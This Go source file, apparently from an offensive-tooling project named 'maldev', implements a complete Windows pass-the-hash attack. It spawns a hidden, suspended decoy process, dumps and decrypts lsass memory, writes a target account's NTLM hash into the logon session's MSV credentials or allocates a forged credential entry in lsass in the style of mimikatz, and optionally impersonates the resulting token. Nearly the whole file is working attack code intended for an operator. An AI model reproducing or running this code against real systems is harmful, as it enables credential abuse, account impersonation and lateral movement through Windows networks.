//go:build windows

package sekurlsa

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"runtime"
	"time"
	"unsafe"

	"github.com/oioio-space/maldev/credentials/lsassdump"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
	"golang.org/x/sys/windows"
)

// msvSettleDelay is the wait between the suspended-spawn returning
// and the lsass dump. CreateProcessWithLogonW's logon-session
// registration in MSV is asynchronous to the caller — lsasrv links
// the new LIST_ENTRY shortly *after* the return, so an immediate
// dump finds the spawned LUID's MSV record missing. 200 ms covers
// every Win10/11 + Server 2019/2022 we tested; adjust upward if
// you see ErrPTHNoMatchingLUID on a slower target.
const msvSettleDelay = 200 * time.Millisecond

// Windows-only Pass / PassImpersonate entry points + spawn helpers
// + the LUID-resolve plumbing (TOKEN_STATISTICS). Cross-platform
// types, sentinel errors, validation, and the MSV mutate helper
// live in pth.go and pth_msv.go.

// Pass spawns the configured Decoy under LOGON_NETCREDENTIALS_ONLY,
// walks the live lsass for the resulting LUID's MSV LIST_ENTRY,
// overwrites the NT/LM/SHA1 hash bytes with PTHTarget's values,
// and resumes the process. The spawned process now outbound-
// authenticates as Target on every subsequent network auth (SMB,
// RDP, Kerberos AS-REQ, NTLM challenge-response).
//
// MSV write-back is wired in this commit. Kerberos write-back
// (long-term keys for AS-REQ pre-auth) lands in the next slice —
// PTHResult.KerberosOverwritten remains false until then.
//
// Sequence:
//
//  1. spawnSuspendedDecoy → PID + LUID of the new logon session.
//  2. lsassdump.OpenLSASS + Dump → minidump bytes (intrusive: opens
//     lsass with PROCESS_VM_READ).
//  3. Parse → Result with sessions; pick the session whose LogonID
//     matches the spawned LUID; pull the *MSVCredential's CipherVA
//     and CipherLen.
//  4. Re-open lsass with PROCESS_VM_READ + PROCESS_VM_WRITE +
//     PROCESS_VM_OPERATION; NtRead at CipherVA to get the live
//     ciphertext (avoids race with the dump snapshot).
//  5. decryptLSA → mutateMSVPrimary(target) → encryptLSA with the
//     parsed lsaKey.
//  6. NtWrite the fresh ciphertext at CipherVA.
//  7. Open the spawned process with PROCESS_SUSPEND_RESUME and call
//     NtResumeProcess. The process now runs with rewritten MSV
//     credentials.
//
// All Nt* calls (Read/Write/Resume) route through p.Caller — pass
// nil for the standard ntdll proc-table path.
//
// On any error past the spawn step, the spawned process is left
// suspended at the returned PID for the operator to clean up.
func Pass(p PTHParams) (PTHResult, error) {
	if err := validatePTHParams(p); err != nil {
		return PTHResult{}, err
	}

	pid, luid, err := spawnSuspendedDecoy(p)
	if err != nil {
		return PTHResult{}, err
	}
	res := PTHResult{PID: pid, LogonID: luid}

	// Let lsass finish linking the MSV LIST_ENTRY before we dump.
	time.Sleep(msvSettleDelay)

	if err := writeBackMSV(&res, p); err != nil {
		return res, err
	}

	if err := resumeProcessByPID(pid, p.Caller); err != nil {
		return res, errors.Join(ErrPTHWriteFailed, fmt.Errorf("resume PID %d: %w", pid, err))
	}
	return res, nil
}

// PassImpersonate is Pass + SetThreadToken: after rewriting the
// spawned process's LSA state, it duplicates the spawned process's
// primary token onto the calling thread so that the operator's
// *current* thread also outbound-authenticates as Target until
// windows.RevertToSelf() is called (or the thread exits).
//
// Caveat: SetThreadToken requires the duplicated token to be an
// IMPERSONATION token. We OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
// then DuplicateTokenEx with SecurityImpersonation level to convert
// the spawned process's primary token into an impersonation token,
// then SetThreadToken(nil, dup) on the calling thread.
//
// Not stubbed any longer — this slice ships the full path. After
// the call returns nil, the caller's thread authenticates outbound
// as PTHTarget. Call windows.RevertToSelf() to undo before the
// thread exits.
func PassImpersonate(p PTHParams) (PTHResult, error) {
	res, err := Pass(p)
	if err != nil {
		return res, err
	}
	if res.PID == 0 {
		return res, nil
	}
	if err := impersonateSpawnedProcess(res.PID); err != nil {
		// MSV write succeeded; impersonation didn't. Surface as
		// non-fatal warning so the caller can still consume the
		// rewritten session (the spawned process is alive).
		res.Warnings = append(res.Warnings,
			fmt.Sprintf("PassImpersonate: SetThreadToken failed: %v", err))
		return res, errors.Join(ErrPTHWriteFailed,
			fmt.Errorf("SetThreadToken: %w", err))
	}
	return res, nil
}

// impersonateSpawnedProcess opens the spawned process, duplicates
// its primary token into an impersonation token, and calls
// SetThreadToken on the calling thread. Caller is responsible for
// windows.RevertToSelf() when done.
func impersonateSpawnedProcess(pid uint32) error {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(QUERY, %d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	var hPrimary windows.Token
	if err := windows.OpenProcessToken(hProc,
		windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hPrimary); err != nil {
		return fmt.Errorf("OpenProcessToken: %w", err)
	}
	defer hPrimary.Close()

	// DuplicateTokenEx → SecurityImpersonation (level 2) →
	// TokenImpersonation type — the combination SetThreadToken
	// accepts.
	var hDup windows.Token
	if err := windows.DuplicateTokenEx(
		hPrimary,
		windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE,
		nil,
		windows.SecurityImpersonation,
		windows.TokenImpersonation,
		&hDup,
	); err != nil {
		return fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	// hDup ownership transfers to the thread on success — do NOT
	// Close() it on the success path. SetThreadToken keeps a
	// reference until RevertToSelf or thread exit.

	if err := windows.SetThreadToken(nil, hDup); err != nil {
		hDup.Close()
		return fmt.Errorf("SetThreadToken: %w", err)
	}
	return nil
}

// writeBackMSV does steps 2-6 of Pass: dump+parse, locate the
// matching MSV credential, NtRead the live ciphertext, mutate +
// re-encrypt, NtWrite back. Sets res.MSVOverwritten on success.
//
// Failures wrap ErrPTHWriteFailed (or ErrPTHNoMatchingLUID when
// the LUID isn't in the dump's MSV walk).
func writeBackMSV(res *PTHResult, p PTHParams) error {
	// 2. Dump lsass.
	hLsass, err := lsassdump.OpenLSASS(p.Caller)
	if err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenLSASS: %w", err))
	}
	var dumpBuf bytes.Buffer
	if _, err := lsassdump.Dump(hLsass, &dumpBuf, p.Caller); err != nil {
		_ = lsassdump.CloseLSASS(hLsass)
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Dump: %w", err))
	}
	_ = lsassdump.CloseLSASS(hLsass)

	// 3. Parse + locate the matching MSV credential.
	parsed, parseErr := Parse(bytes.NewReader(dumpBuf.Bytes()), int64(dumpBuf.Len()))
	// MSV-not-found is a hard fail for PTH (no MSV provider = no
	// hash slots to overwrite); other partial-parse errors propagate.
	if parsed == nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("Parse: %w", parseErr))
	}
	if parseErr != nil && !errors.Is(parseErr, ErrUnsupportedBuild) {
		// ErrUnsupportedBuild leaves keys+sessions empty — we can't
		// proceed. Other warnings (missing optional providers) are
		// surfaced via res.Warnings below.
		if errors.Is(parseErr, ErrLSASRVNotFound) || errors.Is(parseErr, ErrMSVNotFound) {
			return errors.Join(ErrPTHWriteFailed, parseErr)
		}
	}
	if parsed.lsaKey == nil {
		return errors.Join(ErrPTHWriteFailed, errors.New("Parse: no lsaKey extracted"))
	}
	res.Warnings = append(res.Warnings, parsed.Warnings...)

	// Open lsass for write — needed by both the in-place overwrite
	// and the allocation fallback path.
	lsassPID, err := lsassdump.LsassPID(p.Caller)
	if err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("LsassPID: %w", err))
	}
	hWrite, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION,
		false, lsassPID)
	if err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("OpenProcess(lsass VM_RW): %w", err))
	}
	defer windows.CloseHandle(hWrite)

	target := findMSVForLUID(parsed, res.LogonID)
	if target != nil {
		// In-place overwrite path: matching session has an existing
		// encrypted PrimaryCredentials blob — read it live, decrypt,
		// mutate the hashes, re-encrypt, write back at the same VA.
		live := make([]byte, target.CipherLen)
		if err := ntReadVirtualMemory(hWrite, uintptr(target.CipherVA), live, p.Caller); err != nil {
			return errors.Join(ErrPTHWriteFailed,
				fmt.Errorf("NtReadVirtualMemory @0x%X: %w", target.CipherVA, err))
		}
		plain, err := decryptLSA(live, parsed.lsaKey)
		if err != nil {
			return errors.Join(ErrPTHWriteFailed, fmt.Errorf("decryptLSA: %w", err))
		}
		mutated, err := mutateMSVPrimary(plain, p.Target)
		if err != nil {
			return err
		}
		fresh, err := encryptLSA(mutated, parsed.lsaKey)
		if err != nil {
			return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA: %w", err))
		}
		if len(fresh) != len(live) {
			return errors.Join(ErrPTHWriteFailed,
				fmt.Errorf("post-encrypt length mismatch %d != %d (would corrupt MSV layout)",
					len(fresh), len(live)))
		}
		if err := ntWriteVirtualMemory(hWrite, uintptr(target.CipherVA), fresh, p.Caller); err != nil {
			return errors.Join(ErrPTHWriteFailed,
				fmt.Errorf("NtWriteVirtualMemory @0x%X: %w", target.CipherVA, err))
		}
		res.MSVOverwritten = true
		return nil
	}

	// Allocation fallback: matching session exists in the MSV
	// LIST_ENTRY but has no encrypted PrimaryCredentials attached
	// (CipherVA=0 — the NETCREDENTIALS_ONLY case). Mirror mimikatz'
	// PTH-via-allocation: NtAllocateVirtualMemory in lsass for a
	// fresh PrimaryCredentials_data list entry + encrypted
	// MSV1_0_PRIMARY_CREDENTIAL blob, then patch the session node's
	// CredentialsOffset field to point at the new entry.
	matchingSession := findSessionByLUID(parsed, res.LogonID)
	if matchingSession == nil {
		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
			"LUID 0x%X not found among %d MSV sessions",
			res.LogonID, len(parsed.Sessions)))
	}
	if matchingSession.MSVNodeVA == 0 {
		// LUID landed via a non-MSV walker (Kerberos / Wdigest /
		// CloudAP merge) — no MSV LIST_ENTRY node exists yet for the
		// spawned session. Allocation fallback can't run without a
		// node to patch. Surface as ErrPTHNoMatchingLUID so the
		// graceful-skip wiring in tests catches this exact case.
		return errors.Join(ErrPTHNoMatchingLUID, fmt.Errorf(
			"LUID 0x%X session present (via non-MSV walker) but has no MSV LIST_ENTRY — allocation fallback requires an MSV node to patch",
			res.LogonID))
	}
	tmpl := templateFor(parsed.BuildNumber)
	if tmpl == nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf(
			"no Template for build %d (allocation path needs MSVLayout offsets)",
			parsed.BuildNumber))
	}
	if err := allocateAndAttachMSVPrimary(hWrite, matchingSession, tmpl, parsed.lsaKey, p); err != nil {
		return err
	}
	res.MSVOverwritten = true
	return nil
}

// findSessionByLUID returns the LogonSession whose LUID matches; or
// nil. Companion to findMSVForLUID — used by the allocation fallback
// when there's no MSVCredential with a non-zero CipherVA (i.e. the
// session has no existing PrimaryCredentials blob to overwrite).
func findSessionByLUID(parsed *Result, luid uint64) *LogonSession {
	for i := range parsed.Sessions {
		if parsed.Sessions[i].LUID == luid {
			return &parsed.Sessions[i]
		}
	}
	return nil
}

// allocateAndAttachMSVPrimary builds a fresh MSV PrimaryCredentials
// list entry + encrypted credential blob in the lsass address space
// and patches the session node's CredentialsOffset field to point at
// it. Mirrors mimikatz' PTH-via-allocation when the spawned session
// (NETCREDENTIALS_ONLY) has no existing creds to overwrite.
//
// Layout of the single allocation (header + cipher contiguous):
//
//	+0x00  Flink uint64                 — points to itself
//	+0x08  Blink uint64                 — points to itself
//	+0x10  Primary UNICODE_STRING (16)  — empty (Length=0, Buffer=nil)
//	+0x20  Credentials UNICODE_STRING:
//	         +0x20  Length    uint16   = cipherLen
//	         +0x22  MaxLength uint16   = cipherLen
//	         +0x24  pad       uint32   = 0
//	         +0x28  Buffer    uint64   = base + 0x30
//	+0x30  Encrypted MSV1_0_PRIMARY_CREDENTIAL bytes (cipherLen)
//
// The encrypted plaintext is a 0x60-byte struct with empty
// Domain/UserName UNICODE_STRINGs (the outer session node already
// carries them) and the target's NTLM at +0x20 + zero LM at +0x30 +
// zero SHA1 at +0x40 — same field layout parseMSVPrimary expects.
func allocateAndAttachMSVPrimary(hLsass windows.Handle, session *LogonSession, tmpl *Template, lsaKey *lsaKey, p PTHParams) error {
	// Build the plaintext with the target's NT hash, padded up to a
	// 16-byte boundary so encryptLSA picks AES (lsasrv expects an
	// AES-encrypted blob; the unaligned 0x54 size would fall into
	// the 3DES branch which lsasrv won't recognize on Win10/11).
	const plainSize = (msvPrimaryWithSHA1End + 15) &^ 15 // 0x60
	plain := make([]byte, plainSize)
	copy(plain[msvPrimaryNTHashOffset:msvPrimaryLMHashOffset], p.Target.NTLM)
	// LM + SHA1 stay zero. 0x54..0x60 is alignment padding (zero).

	cipher, err := encryptLSA(plain, lsaKey)
	if err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("encryptLSA(new MSV primary): %w", err))
	}
	cipherLen := uint16(len(cipher))

	const headerSize = 0x30
	totalSize := headerSize + len(cipher)

	// 1. NtAllocateVirtualMemory in lsass.
	base, err := ntAllocateInProcess(hLsass, uintptr(totalSize), p.Caller)
	if err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("NtAllocateVirtualMemory: %w", err))
	}

	// 2. Build the entry header bytes.
	buf := make([]byte, totalSize)
	// Flink = Blink = base (self-referential single-entry list).
	binary.LittleEndian.PutUint64(buf[0x00:0x08], uint64(base))
	binary.LittleEndian.PutUint64(buf[0x08:0x10], uint64(base))
	// Primary UNICODE_STRING at +0x10 — left zeroed (empty).
	// Credentials UNICODE_STRING at +0x20:
	binary.LittleEndian.PutUint16(buf[0x20:0x22], cipherLen)             // Length
	binary.LittleEndian.PutUint16(buf[0x22:0x24], cipherLen)             // MaxLength
	binary.LittleEndian.PutUint64(buf[0x28:0x30], uint64(base)+headerSize) // Buffer
	// Cipher follows at +0x30.
	copy(buf[headerSize:], cipher)

	// 3. NtWriteVirtualMemory the whole 0x90 buffer.
	if err := ntWriteVirtualMemory(hLsass, base, buf, p.Caller); err != nil {
		return errors.Join(ErrPTHWriteFailed, fmt.Errorf("NtWriteVirtualMemory(new entry): %w", err))
	}

	// 4. Patch the session node's CredentialsOffset field to point
	// at the new list entry.
	credOffsetVA := uintptr(session.MSVNodeVA) + uintptr(tmpl.MSVLayout.CredentialsOffset)
	var ptr [8]byte
	binary.LittleEndian.PutUint64(ptr[:], uint64(base))
	if err := ntWriteVirtualMemory(hLsass, credOffsetVA, ptr[:], p.Caller); err != nil {
		return errors.Join(ErrPTHWriteFailed,
			fmt.Errorf("NtWriteVirtualMemory(node.CredentialsOffset @0x%X): %w", credOffsetVA, err))
	}
	return nil
}

// ntAllocateInProcess wraps NtAllocateVirtualMemory with the standard
// PTH allocation params: address=0 (let the kernel pick), zero bits=0,
// MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE. Returns the base VA in the
// target process.
func ntAllocateInProcess(h windows.Handle, size uintptr, caller *wsyscall.Caller) (uintptr, error) {
	var base uintptr
	regionSize := size
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtAllocateVirtualMemory",
			uintptr(h),
			uintptr(unsafe.Pointer(&base)),
			0,
			uintptr(unsafe.Pointer(&regionSize)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_READWRITE,
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtAllocateVirtualMemory.Call(
			uintptr(h),
			uintptr(unsafe.Pointer(&base)),
			0,
			uintptr(unsafe.Pointer(&regionSize)),
			windows.MEM_COMMIT|windows.MEM_RESERVE,
			windows.PAGE_READWRITE,
		)
		r = rr
	}
	if r != 0 {
		return 0, fmt.Errorf("NTSTATUS 0x%X", uint32(r))
	}
	return base, nil
}

// findMSVForLUID scans parsed.Sessions for the LUID and returns the
// first non-nil *MSVCredential with a populated CipherVA. Returns
// nil if no match — callers wrap that as ErrPTHNoMatchingLUID.
func findMSVForLUID(parsed *Result, luid uint64) *MSVCredential {
	for i := range parsed.Sessions {
		s := &parsed.Sessions[i]
		if s.LUID != luid {
			continue
		}
		for _, c := range s.Credentials {
			if msv, ok := c.(*MSVCredential); ok && msv.CipherVA != 0 {
				return msv
			}
		}
	}
	return nil
}

// ntReadVirtualMemory mirrors lsassdump's helper: route the call
// through the wsyscall.Caller when non-nil, fall back to the ntdll
// proc-table when nil.
func ntReadVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsyscall.Caller) error {
	if len(buf) == 0 {
		return nil
	}
	var read uintptr
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtReadVirtualMemory",
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&read)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtReadVirtualMemory.Call(
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&read)),
		)
		r = rr
	}
	if r != 0 {
		return fmt.Errorf("NTSTATUS 0x%X", uint32(r))
	}
	if int(read) != len(buf) {
		return fmt.Errorf("short read: got %d want %d", read, len(buf))
	}
	return nil
}

// ntWriteVirtualMemory mirrors the read helper for the write
// direction. Used by Pass to overwrite the MSV ciphertext at the
// captured CipherVA.
func ntWriteVirtualMemory(h windows.Handle, addr uintptr, buf []byte, caller *wsyscall.Caller) error {
	if len(buf) == 0 {
		return nil
	}
	var written uintptr
	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtWriteVirtualMemory",
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&written)),
		)
		r = rr
	} else {
		rr, _, _ := api.ProcNtWriteVirtualMemory.Call(
			uintptr(h),
			addr,
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(&written)),
		)
		r = rr
	}
	if r != 0 {
		return fmt.Errorf("NTSTATUS 0x%X", uint32(r))
	}
	if int(written) != len(buf) {
		return fmt.Errorf("short write: got %d want %d", written, len(buf))
	}
	return nil
}

// resumeProcessByPID opens the spawned process with
// PROCESS_SUSPEND_RESUME and calls NtResumeProcess (single-arg NT
// API; routes through caller when non-nil).
func resumeProcessByPID(pid uint32, caller *wsyscall.Caller) error {
	h, err := windows.OpenProcess(windows.PROCESS_SUSPEND_RESUME, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(SUSPEND_RESUME, %d): %w", pid, err)
	}
	defer windows.CloseHandle(h)

	var r uintptr
	if caller != nil {
		rr, _ := caller.Call("NtResumeProcess", uintptr(h))
		r = rr
	} else {
		rr, _, _ := api.ProcNtResumeProcess.Call(uintptr(h))
		r = rr
	}
	if r != 0 {
		return fmt.Errorf("NtResumeProcess: NTSTATUS 0x%X", uint32(r))
	}
	return nil
}

// spawnSuspendedDecoy launches the decoy process under
// LOGON_NETCREDENTIALS_ONLY + CREATE_SUSPENDED, queries its primary
// token for the LUID, closes the handles, and returns (PID, LUID).
//
// LOGON_NETCREDENTIALS_ONLY (= 2) tells Windows: "use the supplied
// credentials only for network auth — local execution stays under
// the calling user's context." That's the lever PTH leans on: we
// don't actually need a valid password (the LSA write-back replaces
// the per-LUID hash bytes before the process makes any outbound
// call), so any non-empty placeholder works.
//
// CREATE_SUSPENDED (= 4) freezes the primary thread before any code
// runs, giving us a stable window to walk lsass and patch the LUID's
// credential structs without racing the spawned process.
//
// Decoy default is "cmd.exe" so a wide range of post-spawn actions
// is available; operators that want a stub should pass DecoyArgs to
// pin behavior (e.g. `cmd.exe /c "ping -t 127.0.0.1 -n 99999 >nul"`).
func spawnSuspendedDecoy(p PTHParams) (uint32, uint64, error) {
	const (
		logonNetCredentialsOnly uint32 = 2
		createSuspended         uint32 = 0x4
	)

	decoy := p.Decoy
	if decoy == "" {
		decoy = `C:\Windows\System32\cmd.exe`
	}
	cmdline := decoy
	if p.DecoyArgs != "" {
		cmdline = decoy + " " + p.DecoyArgs
	}

	// CreateProcessWithLogonW credentials: any non-empty values work
	// because the LSA write-back is going to replace the per-LUID
	// hashes before the process makes any outbound call. We pass the
	// actual target principal so the lineage in process trees / event
	// logs reads consistently with what the operator intended.
	ptrUser, err := windows.UTF16PtrFromString(p.Target.Username)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Username): %w", err))
	}
	ptrDom, err := windows.UTF16PtrFromString(p.Target.Domain)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Domain): %w", err))
	}
	// Decoy password — any non-empty UTF-16 string. The spawn
	// doesn't validate it (LOGON_NETCREDENTIALS_ONLY skips local
	// cred check). UTF16PtrFromString rejects embedded NULs, so
	// the placeholder is a plain ASCII marker.
	ptrPwd, err := windows.UTF16PtrFromString("pth-decoy-placeholder")
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(decoy pwd): %w", err))
	}
	ptrApp, err := windows.UTF16PtrFromString(decoy)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(Decoy): %w", err))
	}
	ptrCmd, err := windows.UTF16PtrFromString(cmdline)
	if err != nil {
		return 0, 0, errors.Join(ErrPTHSpawnFailed, fmt.Errorf("UTF16(cmdline): %w", err))
	}

	si := &windows.StartupInfo{
		Cb:         uint32(unsafe.Sizeof(windows.StartupInfo{})),
		ShowWindow: windows.SW_HIDE,
		Flags:      windows.STARTF_USESHOWWINDOW,
	}
	pi := &windows.ProcessInformation{}

	creationFlags := uintptr(createSuspended) |
		uintptr(windows.CREATE_UNICODE_ENVIRONMENT) |
		uintptr(windows.CREATE_DEFAULT_ERROR_MODE)

	ret, _, e1 := api.ProcCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(ptrUser)),
		uintptr(unsafe.Pointer(ptrDom)),
		uintptr(unsafe.Pointer(ptrPwd)),
		uintptr(logonNetCredentialsOnly),
		uintptr(unsafe.Pointer(ptrApp)),
		uintptr(unsafe.Pointer(ptrCmd)),
		creationFlags,
		0, // lpEnvironment — inherit
		0, // lpCurrentDirectory — inherit
		uintptr(unsafe.Pointer(si)),
		uintptr(unsafe.Pointer(pi)),
	)
	runtime.KeepAlive(ptrUser)
	runtime.KeepAlive(ptrDom)
	runtime.KeepAlive(ptrPwd)
	runtime.KeepAlive(ptrApp)
	runtime.KeepAlive(ptrCmd)
	runtime.KeepAlive(si)
	runtime.KeepAlive(pi)

	if int(ret) == 0 {
		return 0, 0, errors.Join(ErrPTHSpawnFailed,
			os.NewSyscallError("CreateProcessWithLogonW", e1))
	}

	// LUID extraction: OpenProcessToken(TOKEN_QUERY) →
	// GetTokenInformation(TokenStatistics, …). The Statistics struct
	// carries AuthenticationId (the LUID we want) at offset 8.
	luid, err := luidFromProcess(windows.Handle(pi.Process))
	// Close handles regardless of LUID success — the process stays
	// suspended after handles close (until someone resumes it via
	// a fresh handle).
	_ = windows.CloseHandle(windows.Handle(pi.Process))
	_ = windows.CloseHandle(windows.Handle(pi.Thread))
	if err != nil {
		return pi.ProcessId, 0, err
	}
	return pi.ProcessId, luid, nil
}

// luidFromProcess opens the primary token of hProcess and returns
// the LUID of its logon session via GetTokenInformation(
// TokenStatistics). hProcess must already grant
// PROCESS_QUERY_INFORMATION (CreateProcessWithLogonW returns one
// with PROCESS_ALL_ACCESS — sufficient).
//
// The TOKEN_STATISTICS structure (windows.h):
//
//	typedef struct _TOKEN_STATISTICS {
//	  LUID                 TokenId;            // +0
//	  LUID                 AuthenticationId;   // +8  ← LUID we want
//	  LARGE_INTEGER        ExpirationTime;     // +16
//	  TOKEN_TYPE           TokenType;          // +24
//	  SECURITY_IMPERSONATION_LEVEL ImpersonationLevel; // +28
//	  ULONG                DynamicCharged;     // +32
//	  ULONG                DynamicAvailable;   // +36
//	  ULONG                GroupCount;         // +40
//	  ULONG                PrivilegeCount;     // +44
//	  LUID                 ModifiedId;         // +48
//	} TOKEN_STATISTICS;
//
// Only AuthenticationId is consumed.
func luidFromProcess(hProcess windows.Handle) (uint64, error) {
	var hToken windows.Token
	if err := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &hToken); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("OpenProcessToken: %w", err))
	}
	defer hToken.Close()

	var stats tokenStatistics
	var retLen uint32
	if err := windows.GetTokenInformation(
		hToken,
		windows.TokenStatistics,
		(*byte)(unsafe.Pointer(&stats)),
		uint32(unsafe.Sizeof(stats)),
		&retLen,
	); err != nil {
		return 0, errors.Join(ErrPTHSpawnFailed,
			fmt.Errorf("GetTokenInformation(TokenStatistics): %w", err))
	}
	luid := uint64(stats.AuthenticationID.HighPart)<<32 |
		uint64(stats.AuthenticationID.LowPart)
	return luid, nil
}

// tokenStatistics mirrors TOKEN_STATISTICS. golang.org/x/sys/windows
// does not expose this struct directly so we declare the minimum we
// consume.
type tokenStatistics struct {
	TokenID            windows.LUID
	AuthenticationID   windows.LUID
	ExpirationTime     int64
	TokenType          uint32
	ImpersonationLevel uint32
	DynamicCharged     uint32
	DynamicAvailable   uint32
	GroupCount         uint32
	PrivilegeCount     uint32
	ModifiedID         windows.LUID
}

// MSV constants + mutateMSVPrimary live in pth_msv.go (cross-platform).
// validatePTHParams lives in pth.go.
